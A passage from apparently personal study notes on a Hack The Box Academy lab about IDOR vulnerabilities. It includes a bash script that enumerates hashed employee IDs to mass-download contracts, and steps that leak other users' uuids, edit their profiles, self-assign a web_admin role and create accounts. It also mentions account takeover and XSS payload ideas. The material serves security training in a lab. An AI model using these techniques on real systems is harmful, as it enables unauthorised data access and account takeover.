</code></pre></div> <p>Next, make a <strong>POST</strong> request on <strong>download.php</strong> with each of the above hashes as the <strong>contract</strong> value, which should give us our final script:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-11-1 name=__codelineno-11-1></a><span class=ch>#!/bin/bash</span>
<a id=__codelineno-11-2 name=__codelineno-11-2></a>
<a id=__codelineno-11-3 name=__codelineno-11-3></a><span class=k>for</span> i <span class=k>in</span> <span class=o>{</span><span class=m>1</span>..10<span class=o>}</span><span class=p>;</span> <span class=k>do</span>
<a id=__codelineno-11-4 name=__codelineno-11-4></a>    <span class=k>for</span> <span class=nb>hash</span> <span class=k>in</span> <span class=k>$(</span><span class=nb>echo</span> -n <span class=nv>$i</span> <span class=p>|</span> base64 -w <span class=m>0</span> <span class=p>|</span> md5sum <span class=p>|</span> tr -d <span class=s1>&#39; -&#39;</span><span class=k>)</span><span class=p>;</span> <span class=k>do</span>
<a id=__codelineno-11-5 name=__codelineno-11-5></a>        curl -sOJ -X POST -d <span class=s2>&quot;contract=</span><span class=nv>$hash</span><span class=s2>&quot;</span> http://SERVER_IP:PORT/download.php
<a id=__codelineno-11-6 name=__codelineno-11-6></a>    <span class=k>done</span>
<a id=__codelineno-11-7 name=__codelineno-11-7></a><span class=k>done</span>
</code></pre></div> <p>With that, we can run the script, and it should download all contracts for employees 1-10:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-12-1 name=__codelineno-12-1></a><span class=gp>hrmns@htb[/htb]$ </span>bash ./exploit.sh
<a id=__codelineno-12-2 name=__codelineno-12-2></a><span class=gp>hrmns@htb[/htb]$ </span>ls -1
<a id=__codelineno-12-3 name=__codelineno-12-3></a>
<a id=__codelineno-12-4 name=__codelineno-12-4></a><span class=go>contract_006d1236aee3f92b8322299796ba1989.pdf</span>
<a id=__codelineno-12-5 name=__codelineno-12-5></a><span class=go>contract_0b24df25fe628797b3a50ae0724d2730.pdf</span>
<a id=__codelineno-12-6 name=__codelineno-12-6></a><span class=go>contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf</span>
<a id=__codelineno-12-7 name=__codelineno-12-7></a><span class=go>contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf</span>
<a id=__codelineno-12-8 name=__codelineno-12-8></a><span class=go>contract_5d4aace023dc088767b4e08c79415dcd.pdf</span>
<a id=__codelineno-12-9 name=__codelineno-12-9></a><span class=go>contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf</span>
<a id=__codelineno-12-10 name=__codelineno-12-10></a><span class=go>contract_b523ff8d1ced96cef9c86492e790c2fb.pdf</span>
<a id=__codelineno-12-11 name=__codelineno-12-11></a><span class=go>contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf</span>
<a id=__codelineno-12-12 name=__codelineno-12-12></a><span class=go>contract_d477819d240e7d3dd9499ed8d23e7158.pdf</span>
<a id=__codelineno-12-13 name=__codelineno-12-13></a><span class=go>contract_f7947d50da7a043693a592b4db43b0a1.pdf</span>
</code></pre></div> <hr> <h1 id=idor-in-insecure-apis>IDOR in insecure APIs<a class=headerlink href=#idor-in-insecure-apis title="Permanent link">&para;</a></h1> <p>IDOR vulnerabilities may also exist in function calls and APIs, and exploiting them would allow us to perform various actions as other users.</p> <p>While <strong>IDOR Information Disclosure Vulnerabilities</strong> allow us to read various types of resources, <strong>IDOR Insecure Function Calls</strong> enable us to call APIs or execute functions as another user.</p> <hr> <h2 id=identifying-insecure-apis>Identifying Insecure APIs<a class=headerlink href=#identifying-insecure-apis title="Permanent link">&para;</a></h2> <p>We can start testing the Edit Profile page for IDOR vulnerabilities:</p> <p><img alt=img src=https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_employee_manager.jpg></p> <p>Click on the <strong>Edit Profile</strong> button, we are taken to a page to edit information of our user profile, namely <strong>Full Name</strong>, <strong>Email</strong>, and <strong>About Me</strong>:</p> <p><img alt=img src=https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_edit_profile.jpg></p> <p>Change any of the details in our profile and click <strong>Update profile</strong>, and we'll see that they get updated and persist through refreshes, which means they get updated in a database somewhere. Intercept the <strong>Update</strong> request in Burp and look at it:</p> <p><img alt=img src=https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_update_request.jpg></p> <p>The page is sending a <strong>PUT</strong> request to the <strong>/profile/api.php/profile/1</strong> API endpoint. <strong>PUT</strong> requests are usually used in APIs to update item details, while <strong>POST</strong> is used to create new items, <strong>DELETE</strong> to delete items, and <strong>GET</strong> to retrieve item details. So, a <strong>PUT</strong> request for the Update profile function is expected. The interesting bit is the JSON parameters it is sending:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-13-1 name=__codelineno-13-1></a><span class=p>{</span>
<a id=__codelineno-13-2 name=__codelineno-13-2></a>    <span class=nt>&quot;uid&quot;</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span>
<a id=__codelineno-13-3 name=__codelineno-13-3></a>    <span class=nt>&quot;uuid&quot;</span><span class=p>:</span> <span class=s2>&quot;40f5888b67c748df7efba008e7c2f9d2&quot;</span><span class=p>,</span>
<a id=__codelineno-13-4 name=__codelineno-13-4></a>    <span class=nt>&quot;role&quot;</span><span class=p>:</span> <span class=s2>&quot;employee&quot;</span><span class=p>,</span>
<a id=__codelineno-13-5 name=__codelineno-13-5></a>    <span class=nt>&quot;full_name&quot;</span><span class=p>:</span> <span class=s2>&quot;Amy Lindon&quot;</span><span class=p>,</span>
<a id=__codelineno-13-6 name=__codelineno-13-6></a>    <span class=nt>&quot;email&quot;</span><span class=p>:</span> <span class=s2>&quot;a_lindon@employees.htb&quot;</span><span class=p>,</span>
<a id=__codelineno-13-7 name=__codelineno-13-7></a>    <span class=nt>&quot;about&quot;</span><span class=p>:</span> <span class=s2>&quot;A Release is like a boat. 80% of the holes plugged is not good enough.&quot;</span>
<a id=__codelineno-13-8 name=__codelineno-13-8></a><span class=p>}</span>
</code></pre></div> <p>The <strong>PUT</strong> request includes a few hidden parameters, like <strong>uid, uuid</strong>, and most interestingly <strong>role</strong>, which is set to <strong>employee</strong>. The web application also appears to be setting the user access privileges (e.g. <strong>role</strong>) on the client-side, in the form of our <strong>Cookie: role=employee</strong> cookie, which appears to reflect the <strong>role</strong> specified for our user. This is a common security issue. The access control privileges are sent as part of the client's HTTP request, either as a cookie or as part of the JSON request, leaving it under the client's control, which could be manipulated to gain more privileges.</p> <p>Unless the web application has a solid access control system on the back-end, <strong>we should be able to set an arbitrary role for our user, which may grant us more privileges</strong>.</p> <hr> <h2 id=exploiting-insecure-apis>Exploiting Insecure APIs<a class=headerlink href=#exploiting-insecure-apis title="Permanent link">&para;</a></h2> <p>Start by changing our <strong>uid</strong> to another user's <strong>uid</strong> (e.g. "<strong>uid</strong>": <strong>2</strong>). However, any number we set other than our own <strong>uid</strong> gets us a response of <strong>uid mismatch</strong>:</p> <p><img alt=alt src=https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_uid_mismatch.jpg></p> <p>The web application appears to be comparing the request's <strong>uid</strong> to the API endpoint (<strong>/1</strong>). This means that a form of access control on the back-end prevents us from arbitrarily changing some JSON parameters, which might be necessary to prevent the web application from crashing or returning errors.</p> <p>We'll change the API endpoint to <strong>/profile/api.php/profile/2</strong>, and change <strong>"uid": 2</strong> to avoid the previous <strong>uid mismatch</strong>:</p> <p><img alt=alt src=https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_uuid_mismatch.jpg></p> <p>This time, we get an error message saying <strong>uuid mismatch</strong>. Application appears to be checking if the <strong>uuid</strong> value we are sending matches the user's <strong>uuid</strong>. Since we are sending our own <strong>uuid</strong>, our request is failing. This appears to be another form of access control to prevent users from changing another user's details.</p> <p>Let's see if we can create a new user with a <strong>POST</strong> request to the API endpoint. We can change the request method to <strong>POST</strong>, change the <strong>uid</strong> to a new <strong>uid</strong>, and send the request to the API endpoint of the new <strong>uid</strong>:</p> <p><img alt=alt src=https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_create_new_user_1.jpg></p> <p>Error: <strong>Creating new employees is for admins only</strong>. The same thing happens when we send a <strong>Delete</strong> request. The web application might be checking our authorization through the <strong>role=employee</strong> cookie because this appears to be the only form of authorization in the HTTP request.</p> <p>Finally, try changing <strong>role</strong> to <strong>admin/administrator</strong> to gain higher privileges. Unfortunately, without knowing a valid <strong>role</strong> name, we get <strong>Invalid role</strong> in the HTTP response, and our <strong>role</strong> does not update: </p> <p><img alt=alt src=https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_invalid_role.jpg></p> <p><strong>So, is the web application secure against IDOR attacks?</strong> So far, we have only been testing the <strong>IDOR Insecure Function Calls</strong>. We have not tested the API's GET request for <strong>IDOR Information Disclosure Vulnerabilities</strong>.</p> <hr> <h2 id=information-disclosure>Information Disclosure<a class=headerlink href=#information-disclosure title="Permanent link">&para;</a></h2> <p>Send a <strong>GET</strong> request with another <strong>uid</strong>:</p> <p><img alt=alt src=https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_get_another_user.jpg></p> <p>This returned the details of another user, with their own <strong>uuid</strong> and <strong>role</strong>, confirming an <strong>IDOR Information Disclosure vulnerability</strong>:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-14-1 name=__codelineno-14-1></a><span class=p>{</span>
<a id=__codelineno-14-2 name=__codelineno-14-2></a>    <span class=nt>&quot;uid&quot;</span><span class=p>:</span> <span class=s2>&quot;2&quot;</span><span class=p>,</span>
<a id=__codelineno-14-3 name=__codelineno-14-3></a>    <span class=nt>&quot;uuid&quot;</span><span class=p>:</span> <span class=s2>&quot;4a9bd19b3b8676199592a346051f950c&quot;</span><span class=p>,</span>
<a id=__codelineno-14-4 name=__codelineno-14-4></a>    <span class=nt>&quot;role&quot;</span><span class=p>:</span> <span class=s2>&quot;employee&quot;</span><span class=p>,</span>
<a id=__codelineno-14-5 name=__codelineno-14-5></a>    <span class=nt>&quot;full_name&quot;</span><span class=p>:</span> <span class=s2>&quot;Iona Franklyn&quot;</span><span class=p>,</span>
<a id=__codelineno-14-6 name=__codelineno-14-6></a>    <span class=nt>&quot;email&quot;</span><span class=p>:</span> <span class=s2>&quot;i_franklyn@employees.htb&quot;</span><span class=p>,</span>
<a id=__codelineno-14-7 name=__codelineno-14-7></a>    <span class=nt>&quot;about&quot;</span><span class=p>:</span> <span class=s2>&quot;It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it.&quot;</span>
<a id=__codelineno-14-8 name=__codelineno-14-8></a><span class=p>}</span>
</code></pre></div> <p>This provides new details, most notably the <strong>uuid</strong>.</p> <hr> <h2 id=modifying-other-users-details>Modifying Other User's Details<a class=headerlink href=#modifying-other-users-details title="Permanent link">&para;</a></h2> <p>With the user's <strong>uuid</strong> at hand, we can change this user's details by sending a <strong>PUT</strong> request to <strong>/profile/api.php/profile/2</strong></p> <p><img alt=alt src=https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_modify_another_user.jpg></p> <p>No error this time, <strong>GET</strong> user details we see it's indeed updated:</p> <p><img alt=alt src=https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_new_another_user_details.jpg>)</p> <p>The ability to modify another user's details also enables us to perform several other attacks. E.g. <strong>modifying a user's email address</strong> and then requesting a password reset link, which will be sent to the email address we specified, allowing us to take control over their account. Another potential attack is <strong>placing an XSS payload in the 'about' field</strong>, which would get executed once the user visits their <strong>Edit profile</strong> page, enabling us to attack the user in different ways.</p> <hr> <h2 id=chaining-two-idor-vulnerabilities>Chaining Two IDOR Vulnerabilities<a class=headerlink href=#chaining-two-idor-vulnerabilities title="Permanent link">&para;</a></h2> <p>Look for other <strong>roles</strong>, ideally an admin role.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-15-1 name=__codelineno-15-1></a><span class=p>{</span>
<a id=__codelineno-15-2 name=__codelineno-15-2></a>    <span class=nt>&quot;uid&quot;</span><span class=p>:</span> <span class=s2>&quot;X&quot;</span><span class=p>,</span>
<a id=__codelineno-15-3 name=__codelineno-15-3></a>    <span class=nt>&quot;uuid&quot;</span><span class=p>:</span> <span class=s2>&quot;a36fa9e66e85f2dd6f5e13cad45248ae&quot;</span><span class=p>,</span>
<a id=__codelineno-15-4 name=__codelineno-15-4></a>    <span class=nt>&quot;role&quot;</span><span class=p>:</span> <span class=s2>&quot;web_admin&quot;</span><span class=p>,</span>
<a id=__codelineno-15-5 name=__codelineno-15-5></a>    <span class=nt>&quot;full_name&quot;</span><span class=p>:</span> <span class=s2>&quot;administrator&quot;</span><span class=p>,</span>
<a id=__codelineno-15-6 name=__codelineno-15-6></a>    <span class=nt>&quot;email&quot;</span><span class=p>:</span> <span class=s2>&quot;webadmin@employees.htb&quot;</span><span class=p>,</span>
<a id=__codelineno-15-7 name=__codelineno-15-7></a>    <span class=nt>&quot;about&quot;</span><span class=p>:</span> <span class=s2>&quot;HTB{FLAG}&quot;</span>
<a id=__codelineno-15-8 name=__codelineno-15-8></a><span class=p>}</span>
</code></pre></div> <p>The admin role name (<strong>web_admin</strong>), we can set it to our user so we can create new users or delete current users. To do so, we will intercept the request when we click on the <strong>Update profile</strong> button and change our role to <strong>web_admin</strong>:</p> <p><img alt=alt src=https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_modify_our_role.jpg></p> <p>We do not get the <strong>Invalid role</strong> error message, nor do we get any access control error messages, meaning that there are no back-end access control measures to what roles we can set for our user. If we <strong>GET</strong> our user details, we see that our <strong>role</strong> has indeed been set to <strong>web_admin</strong>:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-16-1 name=__codelineno-16-1></a><span class=p>{</span>
<a id=__codelineno-16-2 name=__codelineno-16-2></a>    <span class=nt>&quot;uid&quot;</span><span class=p>:</span> <span class=s2>&quot;1&quot;</span><span class=p>,</span>
<a id=__codelineno-16-3 name=__codelineno-16-3></a>    <span class=nt>&quot;uuid&quot;</span><span class=p>:</span> <span class=s2>&quot;40f5888b67c748df7efba008e7c2f9d2&quot;</span><span class=p>,</span>
<a id=__codelineno-16-4 name=__codelineno-16-4></a>    <span class=nt>&quot;role&quot;</span><span class=p>:</span> <span class=s2>&quot;web_admin&quot;</span><span class=p>,</span>
<a id=__codelineno-16-5 name=__codelineno-16-5></a>    <span class=nt>&quot;full_name&quot;</span><span class=p>:</span> <span class=s2>&quot;Amy Lindon&quot;</span><span class=p>,</span>
<a id=__codelineno-16-6 name=__codelineno-16-6></a>    <span class=nt>&quot;email&quot;</span><span class=p>:</span> <span class=s2>&quot;a_lindon@employees.htb&quot;</span><span class=p>,</span>
<a id=__codelineno-16-7 name=__codelineno-16-7></a>    <span class=nt>&quot;about&quot;</span><span class=p>:</span> <span class=s2>&quot;A Release is like a boat. 80% of the holes plugged is not good enough.&quot;</span>
<a id=__codelineno-16-8 name=__codelineno-16-8></a><span class=p>}</span>
</code></pre></div> <p>Refresh the page to update our cookie, or manually set it as <strong>Cookie: role=web_admin</strong>, and then intercept the <strong>Update</strong> request to create a new user and see if we'd be allowed to do so:</p> <p><img alt=alt src=https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_create_new_user_2.jpg></p> <p>No error message. If we send a <strong>GET</strong> request for the new user, we see that it has been successfully created:</p> <p><img alt=img src=https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_get_new_user.jpg></p> <p>By combining the information we gained from the <strong>IDOR Information Disclosure vulnerability</strong> with an <strong>IDOR Insecure Function Calls</strong> attack on an API endpoint, we could modify other users' details and create/delete users while bypassing various access control checks in place. On many occasions, the information we leak through IDOR vulnerabilities can be utilized in other attacks, like IDOR or XSS, leading to more sophisticated attacks or bypassing existing security mechanisms.</p> </article> </div> </div> <a href=# class="md-top md-icon" data-md-component=top data-md-state=hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"/></svg> Back to top </a> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../http_verb_tampering/ class="md-footer__link md-footer__link--prev" aria-label="Previous: HTTP Verb Tampering" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Previous </span> HTTP Verb Tampering </div> </div> </a> <a href=../xxe/ class="md-footer__link md-footer__link--next" aria-label="Next: XML External Entity (XXE) Injection" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Next </span> XML External Entity (XXE) Injection </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2021 - 2022 dh </div> </div> <div class=md-social> <a href=https://github.com/hrmnsio target=_blank rel=noopener title=github.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg> </a> <a href=https://twitter.com/dhrmns target=_blank rel=noopener title=twitter.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg> </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../..", "features": ["content.code.annotate", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest"], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../assets/javascripts/workers/search.361d90f1.min.js"}</script> <script src=../../assets/javascripts/bundle.289a2a4b.min.js></script> </body> </html>